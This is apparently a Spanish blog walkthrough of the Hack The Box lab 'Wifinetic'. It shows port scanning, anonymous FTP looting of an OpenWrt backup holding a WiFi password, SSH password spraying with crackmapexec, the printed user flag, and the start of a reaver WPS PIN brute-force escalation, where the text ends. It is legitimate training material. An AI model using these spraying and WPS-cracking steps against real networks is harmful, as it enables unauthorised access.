---
layout: single
title: Wifinetic - Hack The Box
excerpt: "En este post vamos a resolver la maquina Wifinetic de la plataforma de Hackthebox donde el servicio FTP tiene habilitado la autenticación anónima que nos permite descargar varios archivos entre ellos un backup que contiene archivos de configuración sobre una red wifi donde nos revelan la contraseña del Access Point ademas nos comparten el passwd donde encontramos el usuario que utiliza la contraseña y nos conectamos por ssh para la escalada de privilegios realizamos fuerza bruta al WPS PIN del Access Point para obtener el PSK y usar la contraseña para ser root"
date: 2023-09-18
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-wifinetic/icon.png 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Hacking Wifi
  - Abusing Capabilities
  - WPS PIN
---

<p align="center">
<img src="/assets/images/htb-writeup-wifinetic/banner.png">
</p>

Estamos ante una maquina **Linux**

```bash
❯ whichSystem.py 10.10.11.247

10.10.11.247 (ttl -> 63): Linux
```

## PortScan

Comenzamos haciendo un escaneo de puertos con **nmap** por el protocolo **TCP**

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.247 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 06:52 CST
Initiating SYN Stealth Scan at 06:52
Scanning 10.10.11.247 [65535 ports]
Discovered open port 53/tcp on 10.10.11.247
Discovered open port 22/tcp on 10.10.11.247
Discovered open port 21/tcp on 10.10.11.247
Completed SYN Stealth Scan at 06:52, 14.47s elapsed (65535 total ports)
Nmap scan report for 10.10.11.247
Host is up, received user-set (0.074s latency).
Scanned at 2023-09-18 06:52:09 CST for 15s
Not shown: 65394 closed tcp ports (reset), 138 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
```

Ahora usamos la función `extractPorts` que tengo incorporada en la `zshrc` para copear los puertos en la `clipboard`

```bash
❯ which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	cat extractPorts.tmp
	rm extractPorts.tmp
}
```

Ahora le pasamos la captura de `nmap` para copear los puertos

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.247
	[*] Open ports: 21,22,53

[*] Ports copied to clipboard
```

Una vez copeados los puertos simplemente hacemos un `ctrl+shift+v` para pegar los puertos y hacer un escaneo para ver las versiones y mas información que corren en los puertos

```bash
❯ nmap -sCV -p21,22,53 10.10.11.247 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 06:55 CST
Nmap scan report for 10.10.11.247
Host is up (0.074s latency).

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.78
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP 

Bueno tenemos 3 puertos abiertos el **22** que corresponde a **SSH**, el **53** de **tcpwrapped** vamos a empezar con el **21** ya que tiene el **FTP Anonymous** habilitado y podemos conectarnos sin proporcionar contraseña 

```bash
❯ ftp 10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:miguel7): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
ftp> 
```

Vemos que hay varios archivos entre ellos ya hay uno que llama la atención que es el **backup** vamos a traernos los archivos a nuestra maquina de atacante

```bash
ftp> prompt off
Interactive mode off.
ftp> mget *
local: MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
226 Transfer complete.
4434 bytes received in 0.00 secs (11.2762 MB/s)
local: ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
226 Transfer complete.
2501210 bytes received in 0.65 secs (3.6851 MB/s)
local: ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
226 Transfer complete.
60857 bytes received in 0.15 secs (409.3246 kB/s)
local: backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
226 Transfer complete.
40960 bytes received in 0.07 secs (546.7095 kB/s)
local: employees_wellness.pdf remote: employees_wellness.pdf
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
226 Transfer complete.
52946 bytes received in 0.15 secs (352.2456 kB/s)
ftp> 
```

## Files 

Una vez los tenemos descargados ya podemos ver que es lo que hay

Vamos a abrir el **employees_wellness.pdf**

```bash
❯ open employees_wellness.pdf
```

![](/assets/images/htb-writeup-wifinetic/web1.png)

Como tal no es muy interesante solo hablan sobre un plan de ejercicio y nutrición pero al final del todo vemos el nombre de un usuario

![](/assets/images/htb-writeup-wifinetic/web2.png)

Vamos ver el **.txt** vemos que nos hablan sobre interfaces de red 

```bash
❯ catn MigrateOpenWrt.txt
  +-------------------------------------------------------+
  |             Replace OpenWRT with Debian                |
  +-------------------------------------------------------+
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |        Evaluate Current OpenWRT Setup        |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Plan and Prepare the Migration       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Inventory current hardware and software   |    |
  |  |   - Identify dependencies and customizations  |    |
  |  |   - Research Debian-compatible alternatives   |    |
  |  |   - Backup critical configurations and data   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |            Install Debian on Devices         |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Obtain latest Debian release              |    |
  |  |   - Check hardware compatibility              |    |
  |  |   - Flash/install Debian on each device       |    |
  |  |   - Verify successful installations           |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Set Up Networking and Services       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Configure network interfaces              |    |
  |  |   - Install and configure Wifi drivers        |    |
  |  |   - Set up DHCP, DNS, and routing             |    |
  |  |   - Install firewall and security measures    |    |
  |  |   - Set up any additional services needed     |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |           Migrate Configurations             |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Adapt OpenWRT configurations to Debian    |    |
  |  |   - Migrate custom settings and scripts       |    |
  |  |   - Ensure compatibility with new system      |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |          Test and Troubleshoot               |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Test Wifi connectivity and performance    |    |
  |  |   - Verify all services are functioning       |    |
  |  |   - Address and resolve any issues            |    |
  |  |   - Test for security issues with Reaver tool |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Monitor and Maintain                 |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Implement regular updates and patches     |    |
  |  |   - Monitor system health and performance     |    |
  |  |   - Maintain and optimize the Debian system   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  +-------------------------------------------------------+
```

Bueno vemos una presentación sobre la empresa pero no hay información importante

![](/assets/images/htb-writeup-wifinetic/web3.png)

Si abrimos este vemos que hablan sobre **OpenWRT**

```bash
❯ open ProjectOpenWRT.pdf
```

![](/assets/images/htb-writeup-wifinetic/web4.png)

Tenemos otro usuario

![](/assets/images/htb-writeup-wifinetic/web5.png)

![](/assets/images/htb-writeup-wifinetic/web6.png)

Vamos a descomprimir el **backup**

```bash
❯ 7z x backup-OpenWrt-2023-07-26.tar

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 40960 bytes (40 KiB)

Extracting archive: backup-OpenWrt-2023-07-26.tar
--
Path = backup-OpenWrt-2023-07-26.tar
Type = tar
Physical Size = 40960
Headers Size = 19968
Code Page = UTF-8

Everything is Ok

Folders: 7
Files: 27
Size:       13804
Compressed: 40960
```

Hay muchos archivos 

```bash
❯ cd etc
❯ ls -la
drwx------ root root 242 B  Mon Sep 11 09:23:33 2023  .
drwxr-xr-x root root 262 B  Mon Sep 18 07:11:41 2023  ..
drwx------ root root 126 B  Mon Sep 11 09:22:02 2023  config
drwx------ root root  92 B  Mon Sep 11 09:22:02 2023  dropbear
drwx------ root root  24 B  Mon Sep 11 09:22:02 2023  luci-uploads
drwx------ root root  66 B  Mon Sep 11 09:22:02 2023  nftables.d
drwx------ root root   8 B  Mon Sep 11 09:22:02 2023  opkg
.rw-r--r-- root root 227 B  Wed Jul 26 04:08:52 2023  group
.rw-r--r-- root root 110 B  Thu Apr 27 14:28:15 2023  hosts
.rw-r--r-- root root 183 B  Thu Apr 27 14:28:15 2023  inittab
.rw-r--r-- root root 420 B  Wed Jul 26 04:09:38 2023  passwd
.rw-r--r-- root root 1.0 KB Thu Apr 27 14:28:15 2023  profile
.rw-r--r-- root root 132 B  Thu Apr 27 14:28:15 2023  rc.local
.rw-r--r-- root root   9 B  Thu Apr 27 14:28:15 2023  shells
.rw-r--r-- root root 475 B  Thu Apr 27 14:28:15 2023  shinit
.rw-r--r-- root root  80 B  Thu Apr 27 14:28:15 2023  sysctl.conf
.rw-r--r-- root root 745 B  Mon Jul 24 13:15:22 2023  uhttpd.crt
.rw-r--r-- root root 121 B  Mon Jul 24 13:15:22 2023  uhttpd.key
```

Vemos varios usuarios

```bash
❯ catn passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

Hay un directorio con nombre **config**

```bash
❯ ls -la
drwx------ root root 126 B  Mon Sep 11 09:22:02 2023  .
drwx------ root root 242 B  Mon Sep 11 09:23:33 2023  ..
.rw-r--r-- root root 959 B  Mon Jul 24 13:15:22 2023  dhcp
.rw-r--r-- root root 134 B  Thu Apr 27 14:28:15 2023  dropbear
.rw-r--r-- root root 2.5 KB Wed Jul 26 04:10:55 2023  firewall
.rw-r--r-- root root 968 B  Mon Jul 24 13:15:22 2023  luci
.rw-r--r-- root root 388 B  Mon Jul 24 15:53:16 2023  network
.rw-r--r-- root root 167 B  Thu Apr 27 14:28:15 2023  rpcd
.rw-r--r-- root root 438 B  Wed Jul 26 04:07:15 2023  system
.rw-r--r-- root root 788 B  Thu Apr 27 14:28:15 2023  ucitrack
.rw-r--r-- root root 783 B  Mon Jul 24 13:15:22 2023  uhttpd
.rw-r--r-- root root 735 B  Wed Jul 26 04:10:55 2023  wireless
```

Vemos un archivo de configuración con 2 dispositivos **radio0 y radio1** una opera en la banda **2.4 GHz** y la otra en la banda **5 GHz** vemos que los configuran para operar como **Access point** en una red inalambrica con el **ssid** **OpenWrt** y pues cuentan con cifrado **WPA-PSK** tenemos que ingresar una contraseña para conectarnos al wifi pero como podemos ver el archivo de configuración ya nos comparten la **password** o **PSK**

```bash
❯ catn wireless

config wifi-device 'radio0'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim0'
	option cell_density '0'
	option channel 'auto'
	option band '2g'
	option txpower '20'

config wifi-device 'radio1'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim1'
	option channel '36'
	option band '5g'
	option htmode 'HE80'
	option cell_density '0'

config wifi-iface 'wifinet0'
	option device 'radio0'
	option mode 'ap'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
	option wps_pushbutton '1'

config wifi-iface 'wifinet1'
	option device 'radio1'
	option mode 'sta'
	option network 'wwan'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
```

## Shell as netadmin

Bueno como tal tenemos una contraseña que se podría estar reutilizando para algun usuario lo que vamos a hacer es que con los usuarios del **passwd** los meteremos en una lista y con `crackmapexec` veremos si algún usuario usa la contraseña 

```bash
❯ cat passwd | awk -F: '{print $1}' > users
```

Ahora vemos que el usuario `netadmin` utiliza la contraseña 

```bash
❯ crackmapexec ssh 10.10.11.247 -u users -p 'VeRyUniUqWiFIPasswrd1!' --continue-on-success
SSH         10.10.11.247    22     10.10.11.247     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.247    22     10.10.11.247     [-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] daemon:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ftp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] nobody:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] dnsmasq:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] logd:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ubus:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [+] netadmin:VeRyUniUqWiFIPasswrd1! 
```

Ahora nos podemos conectar como ese usuario por **SSH**

```bash
❯ ssh netadmin@10.10.11.247
The authenticity of host '10.10.11.247 (10.10.11.247)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.247' (ECDSA) to the list of known hosts.
netadmin@10.10.11.247's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 18 Sep 2023 01:30:22 PM UTC

  System load:            0.11
  Usage of /:             75.4% of 4.76GB
  Memory usage:           13%
  Swap usage:             0%
  Processes:              229
  Users logged in:        1
  IPv4 address for eth0:  10.10.11.247
  IPv6 address for eth0:  dead:beef::250:56ff:feb9:43f0
  IPv4 address for wlan0: 192.168.1.1
  IPv4 address for wlan1: 192.168.1.23


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Sep 18 13:19:39 2023 from 10.10.16.17
netadmin@wifinetic:~$ export TERM=xterm
netadmin@wifinetic:~$ 
```

## User.txt 

Aquí podemos ver la **flag**

```bash
netadmin@wifinetic:~$ cat user.txt 
7dd4ac7a7c1ce9ca120ff8804b824313
netadmin@wifinetic:~$ 
```

## Privilege Escalation 

No tenemos ningún privilegio a nivel de sudoers

```bash
netadmin@wifinetic:~$ sudo -l
[sudo] password for netadmin: 
Sorry, user netadmin may not run sudo on wifinetic.
netadmin@wifinetic:~$ 
```

Hay demasiados usuarios en el sistema

```bash
netadmin@wifinetic:~$ cat /etc/passwd |  grep bash
root:x:0:0:root:/root:/bin/bash
netadmin:x:1000:1000::/home/netadmin:/bin/bash
sjohnson88:x:1001:1001:Network Engineer:/home/sjohnson88:/bin/bash
janderson42:x:1002:1002:Wireless Solutions Specialist:/home/janderson42:/bin/bash
eroberts25:x:1003:1003:Network Operations Manager:/home/eroberts25:/bin/bash
mhughes12:x:1004:1004:WiFi Security Analyst:/home/mhughes12:/bin/bash
jletap77:x:1005:1005:Customer Support Technician:/home/jletap77:/bin/bash
bwhite3:x:1006:1006:Network Architect:/home/bwhite3:/bin/bash
lturner56:x:1007:1007:WiFi Marketing Manager:/home/lturner56:/bin/bash
tcarter90:x:1008:1008:Technical Support Specialist:/home/tcarter90:/bin/bash
owalker17:x:1009:1009:Wireless Network Administrator:/home/owalker17:/bin/bash
dmorgan99:x:1010:1010:WiFi Project Coordinator:/home/dmorgan99:/bin/bash
kgarcia22:x:1011:1011:Network Technician:/home/kgarcia22:/bin/bash
mrobinson78:x:1012:1012:WiFi Deployment Specialist:/home/mrobinson78:/bin/bash
jallen10:x:1013:1013:Wireless Network Engineer:/home/jallen10:/bin/bash
pharris47:x:1014:1014:WiFi Solutions Architect:/home/pharris47:/bin/bash
ayoung33:x:1015:1015:Network Security Analyst:/home/ayoung33:/bin/bash
tclark84:x:1016:1016:Wireless Support Specialist:/home/tclark84:/bin/bash
nlee61:x:1017:1017:WiFi Sales Representative:/home/nlee61:/bin/bash
dwright27:x:1018:1018:Network Operations Coordinator:/home/dwright27:/bin/bash
swood93:x:1019:1019:HR Manager:/home/swood93:/bin/bash
rturner45:x:1020:1020:Wireless Solutions Consultant:/home/rturner45:/bin/bash
mickhat:x:1021:1021:CEO:/home/mickhat:/bin/bash
netadmin@wifinetic:~$ 
```

No vemos nada interesante al filtrar Binarios **SUID**

```bash
netadmin@wifinetic:/$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
netadmin@wifinetic:/$ 
```

Si filtramos por **capabilities** vemos que esta `reaver` 

![](/assets/images/htb-writeup-wifinetic/web7.png)

```bash
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
netadmin@wifinetic:~$
```

Vemos que tenemos varias interfaces de red 

```bash
netadmin@wifinetic:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:43f0  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:43f0  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:43:f0  txqueuelen 1000  (Ethernet)
        RX packets 414099  bytes 32481066 (32.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 334539  bytes 46250666 (46.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 141210  bytes 9319052 (9.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 141210  bytes 9319052 (9.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 568222  bytes 100165028 (100.1 MB)
        RX errors 0  dropped 559501  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 19277  bytes 1893514 (1.8 MB)
        RX errors 0  dropped 2601  overruns 0  frame 0
        TX packets 22234  bytes 2656243 (2.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 5547  bytes 772468 (772.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19197  bytes 2227512 (2.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

netadmin@wifinetic:~$ 
```

La interfaz **mon** parece ser como la interfaz que vimos en el post anterior del modo monitor si queremos ver mas información sobre las interfaces podemos ejecutar `iw dev` que proporciona información detallada sobre interfaces 

```bash
netadmin@wifinetic:~$ iw dev
phy#2
	Interface mon0
		ifindex 7
		wdev 0x200000002
		addr 02:00:00:00:02:00
		type monitor
		txpower 20.00 dBm
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm
phy#1
	Unnamed/non-netdev interface
		wdev 0x10000051d
		addr 42:00:00:00:01:00
		type P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		type managed
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr 02:00:00:00:00:00
		ssid OpenWrt
		type AP
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
netadmin@wifinetic:~$ 
```

## WPA Brute Force (reaver)

Bueno vemos que **wlan0** esta en **phy0** y corre un **AP** en el canal **1** **wlan1** esta en **phy1** pero bueno si recordamos podemos usar **reaver** el cual es una herramienta de fuerza bruta que funciona para el protocolo **WPA PSK** recordemos que **WPA** significa es una red protegida es el sucesor de **WEP (Wired Equivalent Privacy)** el equipo que tengas 8 dígitos en la parte de atrás como tu modem si el usuario los sabe puede unirse ala red el problema es que pueden haber millones de combinaciones es por eso que usaremos **Reaver** <https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html>

```bash
❯ reaver -h

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

Required Arguments:
	-i, --interface=<wlan>          Name of the monitor-mode interface to use
	-b, --bssid=<mac>               BSSID of the target AP

Optional Arguments:
	-m, --mac=<mac>                 MAC of the host system
	-e, --essid=<ssid>              ESSID of the target AP
	-c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)
	-s, --session=<file>            Restore a previous session file
	-C, --exec=<command>            Execute the supplied command upon successful pin recovery
	-f, --fixed                     Disable channel hopping
	-5, --5ghz                      Use 5GHz 802.11 channels
	-v, --verbose                   Display non-critical warnings (-vv or -vvv for more)
	-q, --quiet                     Only display critical messages
	-h, --help                      Show help

Advanced Options:
	-p, --pin=<wps pin>             Use the specified pin (may be arbitrary string or 4/8 digit WPS pin)
	-d, --delay=<seconds>           Set the delay between pin attempts [1]
	-l, --lock-delay=<seconds>      Set the time to wait if the AP locks WPS pin attempts [60]
	-g, --max-attempts=<num>        Quit after num pin attempts
	-x, --fail-wait=<seconds>       Set the time to sleep after 10 unexpected failures [0]
	-r, --recurring-delay=<x:y>     Sleep for y seconds every x pin attempts
	-t, --timeout=<seconds>         Set the receive timeout period [10]
	-T, --m57-timeout=<seconds>     Set the M5/M7 timeout period [0.40]
	-A, --no-associate              Do not associate with the AP (association must be done by another application)
	-N, --no-nacks                  Do not send NACK messages when out of order packets are received
	-S, --dh-small                  Use small DH keys to improve crack speed
	-L, --ignore-locks              Ignore locked state reported by the target AP
	-E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet
	-J, --timeout-is-nack           Treat timeout as NACK (DIR-300/320)
	-F, --ignore-fcs                Ignore frame checksum errors
	-w, --win7                      Mimic a Windows 7 registrar [False]
	-K, --pixie-dust                Run pixiedust attack
	-Z                              Run pixiedust attack
	-O, --output-file=<filename>    Write packets of interest into pcap file

Example:
	reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
```

mos el **BSSID** del **AP** hay podemos ver la dirección **MAC** de **OpenWrt**

```bash
netadmin@wifinetic:~$ iw dev
phy#2
	Interface mon0
		ifindex 7
		wdev 0x200000002
		addr 02:00:00:00:02:00
		type monitor
		txpower 20.00 dBm
	Interface wlan2
netadmin@wifinetic:~$ iwconfig
hwsim0    no wireless extensions.

wlan2     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan1     IEEE 802.11  ESSID:"OpenWrt"  
          Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:00:00   
          Bit Rate:18 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=70/70  Signal level=-30 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:8   Missed beacon:0

lo        no wireless extensions.

wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
eth0      no wireless extensions.

netadmin@wifinetic:~$ 
```

